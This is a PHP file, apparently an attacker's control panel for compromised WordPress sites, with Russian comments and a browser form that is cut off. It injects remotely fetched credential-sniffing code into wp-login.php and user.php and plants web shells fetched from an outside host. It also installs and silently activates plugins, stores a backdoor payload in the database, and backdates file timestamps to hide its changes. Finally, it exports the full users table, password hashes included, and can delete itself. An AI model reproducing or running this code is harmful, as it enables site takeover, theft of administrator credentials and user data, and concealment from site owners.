<?php
session_start();
ini_set('display_startup_errors', 1);
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Функция для поиска корня WordPress
function find_wp_root() {
    $dir = dirname(__FILE__);
    $is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'); // Проверяем, Windows ли
    
    do {
        $path = $dir . '/wp-load.php';
        
        // Если Windows, заменяем обратные слеши на прямые
        if ($is_windows) {
            $path = str_replace('\\', '/', $path);
        }
        
        if (file_exists($path)) {
            $root = $dir . '/';
            return $is_windows ? str_replace('\\', '/', $root) : $root;
        }
    } while ($dir = realpath("$dir/.."));
    
    return null;
}

$wp_root = find_wp_root();
if ($wp_root) {
    define('ABSPATH', $wp_root);
    require_once(ABSPATH . 'wp-load.php');
} else {
    die('WordPress installation not found');
}

$config_file = ABSPATH . "wp-config.php";

if (file_exists($config_file)) {
    $content = file_get_contents($config_file);
    if (preg_match('/\$table_prefix\s*=\s*[\'"]([^\'"]+)[\'"]\s*;/', $content, $matches)) {
        $table_prefix = $matches[1];
    } else {
        echo "Не удалось найти переменную \$table_prefix в файле wp-config.php.";
    }
} else {
    echo "Файл wp-config.php не найден.";
}

define('TABLE_NAME', $table_prefix . 'custom_table');
define('BACKDOOR_FILE', 'backdoor-code.txt');

if (!isset($_SESSION['backups'])) {
    $_SESSION['backups'] = [];
}

// Параметры для функции w
$w_params = [
    [
        'put' => "wp-login.php", //куда вставлять
        'get' => 'http://localhost/christellskin_com/ack.txt', //что вставлять
        'info' => "Admin-sniff в wp-login.php",
        'insertBefore' => "function wp_shake_js" //перед какой строкой вставлять. если null, то вставит перед вторым комментом /**
    ],
    [
        'put' => "wp-includes/user.php", //куда вставлять
        'get' => 'http://localhost/adminsniff/wordpress/php-sniff.txt', //что вставлять
        'info' => "Admin-sniff в wp-includes/user.php",
        'insertBefore' => "do_action( 'wp_login" //перед какой строкой вставлять
    ]
];

// Параметры для функции s
$s_params = [
    [
        'put' => "/wp-includes/back2.php", //куда вставлять
        'get' => 'https://static-yotpo.com/ssh/inc/incin.txt',
        'info' => "Shell Inserting Test 1"
    ],
	[
        'put' => "/wp-includes/custom_directory0/custom_directory1/custom_directory2/back.php", //куда вставлять. папка custom_directory не существует, но если отмечн чекбокс, то она будет создана.
        'get' => 'https://static-yotpo.com/ssh/inc/incin.txt',
        'info' => "Shell Inserting Test 1"
    ]
];

// Параметры для вставки плагина
$plugin_params = [
    [
        'put' => "/wp-content/plugins/cookie-hoouki.zip", //куда вставлять
        'get' => 'http://localhost/wordpress/cookie-hoouki.zip',
        'info' => "Plugin Inserting"
    ],
	[
        'put' => "/wp-content/plugins/new-plugin.zip", //куда вставлять
        'get' => 'http://localhost/adminsniff/new-admin-sniff/latest/new-plugin.zip',
        'info' => "Plugin Inserting"
    ]	
];
/******************************************************************************************************/

// Проверка GET-параметров
if (!empty($_GET["check"])) {
    echo "19ad89bc3e3c9d7ef68b89523eff1987";
    exit();
}

if (!empty($_GET["connect"])) {
	// Функция для создания бэкапа
	function create_backup($filePath) {
		$backupPath = $filePath . '.bak';

		if (file_exists($filePath)) {
			// Сохраняем оригинальную дату модификации
			$originalModificationTime = filemtime($filePath);

			// Копируем файл в бэкап
			if (copy($filePath, $backupPath)) {
				// Устанавливаем оригинальную дату модификации для бэкапа
				touch($backupPath, $originalModificationTime);

				// Сохраняем информацию о бэкапе в сессию
				$_SESSION['backups'][] = [
					'original' => $filePath,
					'backup' => $backupPath,
					'modified_time' => $originalModificationTime
				];

				return true;
			}
		}
		return false;
	}
	
	// Функция для восстановления из бэкапа
	function restore_from_backup($filePath) {
		if (isset($_SESSION['backups'])) {
			foreach ($_SESSION['backups'] as $backup) {
				if ($backup['original'] === $filePath) {
					$backupPath = $backup['backup'];
					$modifiedTime = $backup['modified_time'];

					// Восстанавливаем файл из бэкапа
					if (copy($backupPath, $filePath)) {
						// Устанавливаем оригинальную дату модификации
						touch($filePath, $modifiedTime);
						return true;
					}
				}
			}
		}
		return false; // Бэкап не найден
	}
	
	// Восстановление всех бэкапов
	function restore_all_backups() {
		if (isset($_SESSION['backups']) && !empty($_SESSION['backups'])) {
			$success = true; // Флаг успешного восстановления

			foreach ($_SESSION['backups'] as $backup) {
				$filePath = $backup['original'];
				$backupPath = $backup['backup'];

				// Восстанавливаем файл из бэкапа
				if (restore_from_backup($filePath)) {
					echo "Файл успешно восстановлен из бэкапа: " . $filePath . "<br />\n";

					// Удаляем бэкап после восстановления
					if (file_exists($backupPath)) {
						if (unlink($backupPath)) {
							echo "Бэкап успешно удален: " . $backupPath . "<br />\n";
						} else {
							echo "Не удалось удалить бэкап: " . $backupPath . "<br />\n";
							$success = false; // Если не удалось удалить бэкап
						}
					} else {
						echo "Бэкап не найден: " . $backupPath . "<br />\n";
						$success = false; // Если бэкап не найден
					}
				} else {
					echo "Не удалось восстановить файл из бэкапа: " . $filePath . "<br />\n";
					$success = false; // Если не удалось восстановить файл
				}
			}

			// Если все файлы успешно восстановлены и бэкапы удалены, очищаем массив бэкапов
			if ($success) {
				$_SESSION['backups'] = [];
				echo "Все бэкапы успешно восстановлены и удалены, массив бэкапов очищен.<br />\n";
			}
		} else {
			echo "Нет бэкапов для восстановления.<br />\n";
		}
	}
	
	

	function delete_backup($filePath) {
		if (isset($_SESSION['backups'])) {
			foreach ($_SESSION['backups'] as $index => $backup) {
				if ($backup['original'] === $filePath) {
					$backupPath = $backup['backup'];

					// Удаляем бэкап
					if (unlink($backupPath)) {
						// Удаляем информацию о бэкапе из сессии
						unset($_SESSION['backups'][$index]);
						// Переиндексируем массив
						$_SESSION['backups'] = array_values($_SESSION['backups']);
						return true;
					}
				}
			}
		}
		return false; // Бэкап не найден
	}
	
	// Функция для удаления бэкапа
	function delete_all_backups() {
		if (isset($_SESSION['backups']) && !empty($_SESSION['backups'])) {
			foreach ($_SESSION['backups'] as $backup) {
				$backupPath = $backup['backup'];
				if (file_exists($backupPath)) {
					if (unlink($backupPath)) {
						echo "Бэкап успешно удален: " . $backupPath . "<br />\n";
					} else {
						echo "Не удалось удалить бэкап: " . $backupPath . "<br />\n";
					}
				} else {
					echo "Бэкап не найден: " . $backupPath . "<br />\n";
				}
			}
			// Очищаем массив бэкапов в сессии
			$_SESSION['backups'] = [];
			echo "Все бэкапы удалены.<br />\n";
		} else {
			echo "Нет бэкапов для удаления.<br />\n";
		}
	}
	
    // Функции для работы с файлами
	function getOldestDirectoryMtime($dir) {
		$oldestMtime = null;

		// Проверяем, существует ли директория
		if (!is_dir($dir)) {
			return null;
		}

		// Получаем список всех элементов в директории
		$items = scandir($dir);
		foreach ($items as $item) {
			if ($item === '.' || $item === '..') {
				continue;
			}

			$itemPath = $dir . '/' . $item;
			if (is_dir($itemPath)) {
				$mtime = filemtime($itemPath);
				if ($oldestMtime === null || $mtime < $oldestMtime) {
					$oldestMtime = $mtime;
				}
			}
		}

		// Если не найдено ни одной директории, проверяем уровень выше
		if ($oldestMtime === null) {
			$parentDir = dirname($dir);
			if ($parentDir !== $dir) { // Чтобы избежать бесконечной рекурсии
				return getOldestDirectoryMtime($parentDir);
			}
		}

		return $oldestMtime;
	}

	function s($put, $get, $info, $create_dirs = false) {
		$filePath = ABSPATH . ltrim($put, '/');
		$dirPath = dirname($filePath);

		// Разбиваем путь на части
		$pathParts = explode('/', trim($put, '/'));
		$currentPath = ABSPATH;

		// Получаем время модификации самой старой директории
		$oldestMtime = getOldestDirectoryMtime($currentPath);

		// Массив для хранения созданных директорий
		$createdDirs = [];

		// Рекурсивно создаем недостающие директории
		foreach ($pathParts as $part) {
			$currentPath .= '/' . $part;

			// Если это не последний элемент (файл), проверяем и создаем директории
			if ($part !== end($pathParts)) {
				if (!is_dir($currentPath)) {
					if ($create_dirs) {
						if (!mkdir($currentPath, 0755)) {
							echo "Ошибка: Не удалось создать директорию $currentPath<br />";
							return;
						}

						// Запоминаем созданную директорию
						$createdDirs[] = $currentPath;
					} else {
						echo "Ошибка: Директория $currentPath не существует<br />";
						return;
					}
				}
			}
		}

		// Устанавливаем время модификации для всех созданных директорий
		if ($oldestMtime !== null) {
			foreach ($createdDirs as $dir) {
				touch($dir, $oldestMtime);
				echo "Время модификации директории $dir установлено на " . date('Y-m-d H:i:s', $oldestMtime) . ".<br />";
			}
		}

		// Проверка доступности записи
		if (!is_writable($dirPath)) {
			echo "Ошибка: Директория $dirPath недоступна для записи<br />";
			return;
		}

		// Если файл уже существует, пропускаем его создание
		if (file_exists($filePath)) {
			echo "Файл $filePath уже существует, пропускаем создание.<br />";
			return;
		}

		// Загрузка и запись контента
		$content = @file_get_contents($get);
		if ($content === false) {
			echo "Ошибка: Не удалось загрузить код из $get<br />";
			return;
		}

		$result = @file_put_contents($filePath, $content);
		if ($result === false) {
			echo "Ошибка: Не удалось записать файл $filePath<br />";
			return;
		}

		// Устанавливаем время модификации для созданного файла
		if (file_exists($filePath)) {
			if ($oldestMtime !== null) {
				touch($filePath, $oldestMtime);
				echo "Время модификации файла $filePath установлено на " . date('Y-m-d H:i:s', $oldestMtime) . ".<br />";
			}

			retime($put);
			send($put, $get, $info);
		}
	}

    function w($put, $get, $info, $insertBefore = null) {
		$filePath = ABSPATH . $put;

		// Создаем бэкап перед изменением
		if (create_backup($filePath)) {
			//echo "Создан бэкап " . $put . ".back для: " . $filePath . "<br />\n";
		} else {
			echo "Ошибка создания бэкапа для: " . $filePath . "<br />\n";
		}

		// Остальная часть функции остается без изменений
		$currentContent = file_get_contents($filePath);
		$newContent = file_get_contents($get);

		if ($insertBefore) {
			$insertPosition = strpos($currentContent, $insertBefore);
			if ($insertPosition !== false) {
				$beforeInsert = substr($currentContent, 0, $insertPosition);
				$afterInsert = substr($currentContent, $insertPosition);
				$combinedContent = $beforeInsert . $newContent . "\n" . $afterInsert;
				file_put_contents($filePath, $combinedContent);
				echo "W: " . $filePath . " (вставлено перед: '$insertBefore')<br />\n";
				retime($put);
				send($put, $get, $info);
			} else {
				echo "Строка '$insertBefore' не найдена в файле: " . $filePath . "<br />\n";
			}
		} else {
			$pattern = '/(\/\/.*?$|\/\*[\s\S]*?\*\/)/m';
			if (preg_match($pattern, $currentContent, $matches, PREG_OFFSET_CAPTURE)) {
				$commentPosition = $matches[0][1] + strlen($matches[0][0]);
				$beforeComment = substr($currentContent, 0, $commentPosition);
				$afterComment = substr($currentContent, $commentPosition);
				$combinedContent = $beforeComment . "\n" . $newContent . "\n" . $afterComment;
				file_put_contents($filePath, $combinedContent);
				echo "W: " . $filePath . "<br />\n";
				retime($put);
				send($put, $get, $info);
			} else {
				echo "Комментарий не найден в файле: " . $filePath . "<br />\n";
			}
		}
	}
	
	// Устанавливаем время модификации только для файлов и папок нового плагина
	function setModificationTimeForPlugin($path, $mtime) {
		foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path)) as $item) {
			touch($item->getPathname(), $mtime);
		}
	}

	function plugin($put, $get, $info) {
		// Определяем полный путь к файлу
		$filePath = ABSPATH . $put;

		// Загружаем архив
		file_put_contents($filePath, file_get_contents($get));
		if (!file_exists($filePath)) {
			echo "Ошибка: Файл не был загружен.";
			return;
		}
		echo "Файл успешно загружен: " . $filePath . "<br />";

		// Получаем время модификации самой старой директории в /wp-content/plugins/
		$pluginsDir = dirname($filePath);
		$oldestMtime = getOldestDirectoryMtime($pluginsDir);
		if ($oldestMtime === null) {
			echo "Не удалось определить время модификации самой старой директории.<br />";
			return;
		}

		// Разархивируем файл
		$zip = new ZipArchive();
		if ($zip->open($filePath) === TRUE) {
			$extractPath = dirname($filePath); // Путь для извлечения файлов
			$zip->extractTo($extractPath);
			$zip->close();
			echo "Архив успешно разархивирован в " . $extractPath . "<br />";
			unlink($filePath); // Удаляем исходный архив
			echo "Исходный архив удален: " . $filePath . "<br />";

			// Определяем имя папки плагина
			$plugin_slug = basename($put, '.zip'); // Имя плагина из имени архива
			$plugin_folder = $pluginsDir . '/' . $plugin_slug; // Полный путь к папке плагина
			
			if (file_exists($plugin_folder)) {
				setModificationTimeForPlugin($plugin_folder, $oldestMtime);
				echo "Время модификации файлов и папок плагина {$plugin_slug} установлено на " . date('Y-m-d H:i:s', $oldestMtime) . ".<br />";
			} else {
				echo "Папка плагина {$plugin_slug} не найдена.<br />";
			}
		} else {
			echo "Ошибка: Не удалось открыть архив для разархивации.";
		}

		// -------------------------------
		// Активация плагина через базу данных
		// -------------------------------
		$plugin_slug = basename($put, '.zip'); // Имя плагина из имени архива
		$plugin_main_file = $plugin_slug . '/' . $plugin_slug . '.php'; // Предполагаемый путь к основному файлу плагина

		// Подключаемся к базе данных
		global $wpdb;

		// Получаем текущий список активных плагинов
		$active_plugins = get_option('active_plugins');

		// Проверяем, что плагин еще не активирован
		if (!in_array($plugin_main_file, $active_plugins)) {
			$active_plugins[] = $plugin_main_file; // Добавляем путь к плагину
			update_option('active_plugins', $active_plugins); // Обновляем опцию
			echo "Плагин {$plugin_main_file} успешно активирован через базу данных.";
		} else {
			echo "Плагин {$plugin_main_file} уже активирован.";
		}
	}

	// Обработка отправленной формы
	if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['install_plugins'])) {
		if (!empty($_POST['plugins'])) {
			$selected_plugins = $_POST['plugins'];

			foreach ($selected_plugins as $index) {
				if (isset($plugin_params[$index])) {
					$plugin = $plugin_params[$index];
					echo "<p>Начинаем установку плагина: " . htmlspecialchars(basename($plugin['put'])) . "</p>";

					// Вызываем функцию установки плагина
					plugin($plugin['put'], $plugin['get'], $plugin['info']);
				} else {
					echo "<p>Ошибка: плагин с индексом $index не найден.</p>";
				}
			}
		} else {
			echo "<p>Пожалуйста, выберите хотя бы один плагин для установки.</p>";
		}
	}

    function retime($file)
    {
        $dir = ABSPATH;
        $stat = stat($dir . "/wp-admin");
        touch($dir . $file, $stat["ctime"], $stat["ctime"]);
        $folder = dirname($dir . $file);
        if ($folder !== $dir)
        {
            touch($folder, $stat["ctime"], $stat["ctime"]);
        }
    }

    function b($put, $get, $info) {
		$filePath = ABSPATH . $put;
		
		// Создаем бэкап перед изменением
		if (create_backup($filePath)) {
			//echo "Создан бэкап для: " . $filePath . "<br />\n";
		} else {
			echo "Ошибка создания бэкапа для: " . $filePath . "<br />\n";
		}

		$p = file_get_contents($get);
		$t = file_get_contents($filePath);

		if (file_exists($filePath)) {
			if (strstr($t, $p) == false) {
				if (strstr($t, '?>') !== false) {
					$new_t = $p . ' ?>';
					file_put_contents($filePath, str_replace('?>', $new_t, $t));
				} else {
					file_put_contents($filePath, $p, FILE_APPEND);
				}
			}
		}

		if (file_exists($filePath) && is_writable($filePath)) {
			echo "B: " . $filePath . "<br />\n";
		}
		retime($put);
		send($put, $get, $info);
	}

    function str_replace_first($from, $to, $content) {
        $from = '/' . preg_quote($from, '/') . '/';
        return preg_replace($from, $to, $content, 1);
    }

    function b_start($put, $get, $info) {
        $p = file_get_contents($get);
        $t = file_get_contents(ABSPATH . $put);

        if (file_exists(ABSPATH . $put)) {
            if (strstr($t, $p) == false) {
                if (strstr($t, '*/') !== false) {
                    $new_t = "*/\n$p";
                    file_put_contents(ABSPATH . $put, str_replace_first('*/', $new_t, $t));
                }
            }
        }

        if (file_exists(ABSPATH . $put) && is_writable(ABSPATH . $put)) {
            echo "B: " . ABSPATH . $put . "<br />\n";
        }
        retime($put);
        send($put, $get, $info);
    }

    function send($file, $shell_url, $text = "") {
        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
        $file_path = $protocol . '://' . $_SERVER["HTTP_HOST"] . $file;

        echo "<pre>";
        echo "[file] => <a target='blank' href=\"" . $file_path . "\">" . $file_path . "</a>     [info] => " . $text . "<br />\n";
        //echo checkLink($file_path) ? "Ссылка открывается." : "Ссылка не открывается.";
        echo "</pre>";
    }
	
	function get_config_value($config_data, $key) {
		preg_match("/define\(\s*'$key',\s*'(.*?)'\s*\)/", $config_data, $matches);
		return isset($matches[1]) ? $matches[1] : null;
	}

    // Функция для вставки данных в базу данных
    function process_wp_config_and_insert_txt($filePath, $txt_file_path, $table_name) {
        if (!file_exists($filePath)) {
            return "Файл конфигурации wp-config.php не найден: {$filePath}\n";
        }

        // Проверка txt_file_path: если это URL, проверяем доступность
        if (filter_var($txt_file_path, FILTER_VALIDATE_URL)) {
            $headers = @get_headers($txt_file_path);
            if (!$headers || strpos($headers[0], '200') === false) {
                return "Ошибка: Указанный URL недоступен или возвращает ошибку.\n";
            }
            $txt_content = @file_get_contents($txt_file_path);
            if ($txt_content === false) {
                return "Ошибка: Не удалось получить содержимое по URL: {$txt_file_path}\n";
            }
        } else {
            if (!file_exists($txt_file_path)) {
                return "Файл с кодом для вставки в базу MySQL не найден: {$txt_file_path}\n";
            }
            $txt_content = file_get_contents($txt_file_path);
            if ($txt_content === false) {
                return "Ошибка чтения локального файла: {$txt_file_path}\n";
            }
        }

        // Считываем wp-config.php
        $config_data = file_get_contents($filePath);
        $db_host = get_config_value($config_data, 'DB_HOST');
        $db_user = get_config_value($config_data, 'DB_USER');
        $db_pass = get_config_value($config_data, 'DB_PASSWORD');
        $db_name = get_config_value($config_data, 'DB_NAME');

        if (!$db_host || !$db_user || !$db_name) {
            return "Ошибка: не удалось найти необходимые данные в wp-config.php\n";
        }

        // Подключение к базе данных
        $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
        if ($conn->connect_error) {
            return "Ошибка подключения к базе данных: " . $conn->connect_error . "\n";
        }

        // Создаем таблицу, если она не существует
        $create_table_sql = "
            CREATE TABLE IF NOT EXISTS {$table_name} (
                id INT AUTO_INCREMENT PRIMARY KEY,
                content TEXT NOT NULL
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
        ";

        if (!$conn->query($create_table_sql)) {
            return "Ошибка при создании таблицы: " . $conn->error . "\n";
        }

        // Вставка данных в таблицу
        $insert_sql = $conn->prepare("INSERT INTO {$table_name} (content) VALUES (?)");
        $insert_sql->bind_param('s', $txt_content);

        if (!$insert_sql->execute()) {
            return "Ошибка вставки данных: " . $insert_sql->error . "\n";
        }

        $insert_sql->close();
        $conn->close();

        return "Код успешно добавлен в таблицу {$table_name}!<br><br>";
    }
	
	// Функция для удаления кода из базы данных
	function delete_from_db($table_name) {
		$filePath = ABSPATH . "/wp-config.php";

		if (!file_exists($filePath)) {
			return "Файл конфигурации wp-config.php не найден: {$filePath}\n";
		}

		// Считываем wp-config.php
		$config_data = file_get_contents($filePath);
		$db_host = get_config_value($config_data, 'DB_HOST');
		$db_user = get_config_value($config_data, 'DB_USER');
		$db_pass = get_config_value($config_data, 'DB_PASSWORD');
		$db_name = get_config_value($config_data, 'DB_NAME');

		if (!$db_host || !$db_user || !$db_name) {
			return "Ошибка: не удалось найти необходимые данные в wp-config.php\n";
		}

		// Подключение к базе данных
		$conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
		if ($conn->connect_error) {
			return "Ошибка подключения к базе данных: " . $conn->connect_error . "\n";
		}
		
		// Удаление таблицы
		$drop_sql = "DROP TABLE IF EXISTS {$table_name}";
		if ($conn->query($drop_sql) === TRUE) {
			$conn->close();
			return "Таблица " . TABLE_NAME . " успешно удалена!<br><br>";
		} else {
			$error = $conn->error;
			$conn->close();
			return "Ошибка при удалении таблицы: " . $error . "<br><br>";
		}
	}
	
	function export_users_to_csv($table_prefix) {
		// Включаем буферизацию вывода
		ob_start();

		$filePath = ABSPATH . "/wp-config.php";

		if (!file_exists($filePath)) {
			echo "Файл конфигурации wp-config.php не найден: {$filePath}\n";
			ob_end_flush(); // Очищаем буфер и выводим сообщение
			return;
		}

		$config_data = file_get_contents($filePath);
		$db_host = get_config_value($config_data, 'DB_HOST');
		$db_user = get_config_value($config_data, 'DB_USER');
		$db_pass = get_config_value($config_data, 'DB_PASSWORD');
		$db_name = get_config_value($config_data, 'DB_NAME');

		if (!$db_host || !$db_user || !$db_name) {
			echo "Ошибка: не удалось найти необходимые данные в wp-config.php\n";
			ob_end_flush(); // Очищаем буфер и выводим сообщение
			return;
		}

		$conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
		if ($conn->connect_error) {
			echo "Ошибка подключения к базе данных: " . $conn->connect_error . "\n";
			ob_end_flush(); // Очищаем буфер и выводим сообщение
			return;
		}

		// Формируем имя таблицы
		$users_table = $table_prefix . 'users';
		echo "Попытка извлечь данные из таблицы: {$users_table}<br>";

		// Проверяем, существует ли таблица
		$check_table_sql = "SHOW TABLES LIKE '{$users_table}'";
		$table_exists = $conn->query($check_table_sql);

		if ($table_exists->num_rows === 0) {
			echo "Таблица {$users_table} не существует.<br>";
			ob_end_flush(); // Очищаем буфер и выводим сообщение
			return;
		}

		// Извлекаем данные из таблицы
		$sql = "SELECT * FROM {$users_table}";
		$result = $conn->query($sql);

		if ($result === false) {
			echo "Ошибка выполнения SQL-запроса: " . $conn->error . "<br>";
			ob_end_flush(); // Очищаем буфер и выводим сообщение
			return;
		}

		if ($result->num_rows === 0) {
			echo "Нет данных для экспорта в таблице {$users_table}.<br>";
			ob_end_flush(); // Очищаем буфер и выводим сообщение
			return;
		}

		$filename = 'users_export_' . date('Y-m-d_H-i-s') . '.csv';
		$file = fopen($filename, 'w');

		if ($file === false) {
			echo "Ошибка создания файла CSV.<br>";
			ob_end_flush(); // Очищаем буфер и выводим сообщение
			return;
		}

		// Заголовки CSV
		$fields = $result->fetch_fields();
		$headers = [];
		foreach ($fields as $field) {
			$headers[] = $field->name;
		}
		fputcsv($file, $headers);

		// Данные
		while ($row = $result->fetch_assoc()) {
			fputcsv($file, $row);
		}

		fclose($file);

		// Очищаем буфер перед отправкой файла
		ob_end_clean();

		// Отправка файла пользователю
		header('Content-Type: application/csv');
		header('Content-Disposition: attachment; filename="' . $filename . '"');
		readfile($filename);
		unlink($filename); // Удаление файла после отправки
		exit();
	}

	// Обработка AJAX-запросов
	if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
		$action = $_POST['action'];

		if ($action === 'w') {
			foreach ($w_params as $params) {
				w($params['put'], $params['get'], $params['info'], $params['insertBefore'] ?? null);
			}
		} elseif ($action === 's') {
			echo "Функция S:<br />";
			// Получаем значение чекбокса "Создать директории"
			$create_dirs = isset($_POST['create_dirs']) && $_POST['create_dirs'] === '1';
			// Вызываем функцию s для каждого набора параметров
			foreach ($s_params as $params) {
				s($params['put'], $params['get'], $params['info'], $create_dirs);
			}
		} /*elseif ($action === 'plugin') {
			echo "Функция plugin:<br />";
			// Вызываем функцию s для каждого набора параметров
			foreach ($plugin_params as $params) {
				plugin($params['put'], $params['get'], $params['info']);
			}
		}*/ elseif ($action === 'plugin') {
        // Новый блок для обработки чекбоксов с плагинами
				if (!empty($_POST['plugins'])) {
					$selected_plugins = $_POST['plugins']; // Массив выбранных индексов плагинов

					foreach ($selected_plugins as $index) {
						if (isset($plugin_params[$index])) {
							$plugin = $plugin_params[$index];
							echo "<p>Начинаем установку плагина: " . htmlspecialchars(basename($plugin['put'])) . "</p>";

							// Вызываем функцию установки плагина
							plugin($plugin['put'], $plugin['get'], $plugin['info']);
						} else {
							echo "<p>Ошибка: плагин с индексом $index не найден.</p>";
						}
					}
				} else {
					echo "<p>Пожалуйста, выберите хотя бы один плагин для установки.</p>";
				}
		} elseif ($action === 'insert_into_db') {
			$filePath = ABSPATH . "/wp-config.php";
			echo process_wp_config_and_insert_txt($filePath, BACKDOOR_FILE, TABLE_NAME);
		} elseif ($action === 'restore_all_backups') {
			restore_all_backups();
		} elseif ($action === 'delete_all_backups') {
			delete_all_backups();
		} elseif ($action === 'delete_from_db') {
			echo delete_from_db(TABLE_NAME);
		} elseif ($action === 'drop_table') {
			echo drop_table(TABLE_NAME);
		} elseif ($action === 'export_users') {
			export_users_to_csv($table_prefix);
		}
		exit();
	}
	
	// Проверяем, был ли отправлен POST-запрос на удаление файла
	if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete']) && $_POST['delete'] == 'true') {
		$currentFile = __FILE__; // Получаем путь к текущему файлу

		// Пытаемся удалить файл
		if (unlink($currentFile)) {
			echo "Файл успешно удален.";
			exit; // Прекращаем выполнение скрипта
		} else {
			echo "Не удалось удалить файл.";
		}
	}
?>

<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Вставка в базу данных</title>
	<style>
	button{padding:10px; margin:10px 0; cursor: pointer; width: 200px;}
	.spinner {
		border: 4px solid #f3f3f3; /* Светлый цвет */
		border-top: 4px solid #3498db; /* Синий цвет */
		border-radius: 50%;
		width: 30px;
		height: 30px;
		animation: spin 1s linear infinite; /* Анимация */
		display: none; /* Скрыт по умолчанию */
		margin: 20px auto;
	}

	@keyframes spin {
		0% { transform: rotate(0deg); }
		100% { transform: rotate(360deg); }
	}
	</style>
    <script>
		async function performAction(action) {
			const spinner = document.getElementById('spinner');
			const resultDiv = document.getElementById('result');
			const createDirs = document.getElementById('create_dirs_checkbox')?.checked;

			spinner.style.display = 'block';

			try {
				const formData = new FormData();
				formData.append('action', action);

				// Если действие - установка плагинов, собираем выбранные плагины
				if (action === 'plugin') {
					const pluginCheckboxes = document.querySelectorAll('input[name="plugins[]"]:checked');
					if (pluginCheckboxes.length === 0) {
						resultDiv.innerHTML += `<br>Пожалуйста, выберите хотя бы один плагин для установки.<br>-------------------------------------------------<br>`;
						return;
					}
					pluginCheckboxes.forEach((checkbox, index) => {
						formData.append(`plugins[]`, checkbox.value);
					});
				} else {
					// Для других действий добавляем состояние чекбокса "Создать директории"
					formData.append('create_dirs', createDirs ? '1' : '0');
				}

				// Отправляем AJAX-запрос
				const response = await fetch('', {
					method: 'POST',
					body: formData
				});

				// Обрабатываем ответ
				const result = await response.text();
				resultDiv.innerHTML += `<br>${result}<br>-------------------------------------------------<br>`;

				if (!response.ok) {
					throw new Error(`HTTP error! Status: ${response.status}`);
				}

			} catch (error) {
				console.error('Ошибка:', error);
				resultDiv.innerHTML += `<br>Ошибка: ${error.message}<br>-------------------------------------------------<br>`;
			} finally {
				spinner.style.display = 'none';
			}
		}
	</script>
	
	<script>
	function exportUsers() {
		const spinner = document.getElementById('spinner');
		const resultDiv = document.getElementById('result');

		spinner.style.display = 'block';

		fetch('', {
			method: 'POST',
			headers: {
				'Content-Type': 'application/x-www-form-urlencoded',
			},
			body: 'action=export_users'
		})
		.then(response => {
			if (response.ok) {
				return response.blob();
			} else {
				throw new Error('Ошибка при экспорте данных');
			}
		})
		.then(blob => {
			if (blob.size === 0) {
				throw new Error('Файл пуст. Возможно, в таблице нет данных.');
			}

			const url = window.URL.createObjectURL(blob);
			const a = document.createElement('a');
			const domain = window.location.hostname.replace(/\./g, '_'); // заменяем точки на пробелы
			a.href = url;
			a.download = `users_export_${domain}.csv`;
			document.body.appendChild(a);
			a.click();
			a.remove();
			window.URL.revokeObjectURL(url);
		})
		.catch(error => {
			console.error('Ошибка:', error);
			resultDiv.innerHTML += `<br>Ошибка: ${error.message}<br>-------------------------------------------------<br>`;
		})
		.finally(() => {
			spinner.style.display = 'none';
		});
	}
	</script>
	
</head>
<body>
	<button id="replaceParamBtn"  style="width:500px; line-height:15px !important;background-color: #d0d5bc !important">Перейти на вкладку с плагинами безопасности</button>
	<script>
	const btn = document.getElementById('replaceParamBtn');
	btn.onclick = function() {
		const url = new URL(window.location.href);

		url.searchParams.delete('connect');

		url.searchParams.set('connect_ant', '1');

		window.location.href = url.href;
	};
	
	btn.addEventListener('mouseover', function() {
		btn.style.backgroundColor = '#c3cba5';
	});
	btn.addEventListener('mouseout', function() {
		btn.style.backgroundColor = '#d0d5bc';
	});	
	</script>
	
	<div style="display: flex; flex-direction: row; justify-content: space-between;">
		<form id="actionForm">
			<div style="display:flex; flex-direction: row; gap:20px">
				<div style="display:flex; flex-direction: column; gap:20px">
					<div style="display:flex; flex-direction: row; gap:20px;padding: 20px;">
						<button type="button" onclick="performAction('w')">Выполнить функцию W</button>
						<button type="button" onclick="performAction('s')">Выполнить функцию S</button>
						<label style="display: flex; align-items: center; gap: 5px;">
							<input type="checkbox" id="create_dirs_checkbox"> Создать директории
						</label>
					</div>
					
					<div style="display:flex; flex-direction: row; gap:20px; border-top: 1px solid #bbb;padding: 20px;">					
						<button type="button" onclick="performAction('delete_all_backups')">Удалить все бэкапы</button>
						<button type="button" onclick="performAction('restore_all_backups')">Восстановить все бэкапы</button>
					</div>
				</div>				
				<div style="display:flex; flex-direction: row; gap:20px; border-left: 1px solid #bbb; padding: 20px;">
					<button type="button" onclick="performAction('insert_into_db')">Вставить код в базу</button>
					<button type="button" onclick="performAction('delete_from_db')">Удалить код из базы</button>
					<button type="button" onclick="exportUsers()">Экспорт пользователей в CSV</button>
				</div>
				<!-- Блок с чекбоксами -->
				<div style="display: flex; flex-direction: column; border: 1px solid #e6e6e6; padding: 20px; gap: 15px; max-width: 400px;">					
					<div style="display: flex; flex-direction: column; gap: 10px;">
						<?php foreach ($plugin_params as $index => $plugin): ?>
							<div style="display: flex; align-items: center;">
								<!--<?php //$plugin_name = basename($plugin['put']); ?>-->
								<?php $plugin_name = basename($plugin['info']); ?>
								<label style="display: flex; align-items: center; gap: 10px;">
									<input type="checkbox" name="plugins[]" value="<?php echo $index; ?>">
									<span><?php echo htmlspecialchars($plugin_name); ?></span>
								</label>
							</div>
						<?php endforeach; ?>
					</div>
					<button type="button" onclick="performAction('plugin')" style="padding: 10px 20px; align-self: flex-start;">Поставить плагин</button>
				</div>
				<!-- End Блок с чекбоксами -->
			</div>
		</form>
	
		
		<!-- Форма для самоудаления файла разброса-->
		<form action="" method="post">
			<div style="border-left: 1px solid #bbb; padding: 20px;">
				<input type="hidden" name="delete" value="true">
				<button type="submit" style="padding: 10px; margin: 10px 0; cursor: pointer; width: 200px; height: 200px;">Удалить файл разброса</button>
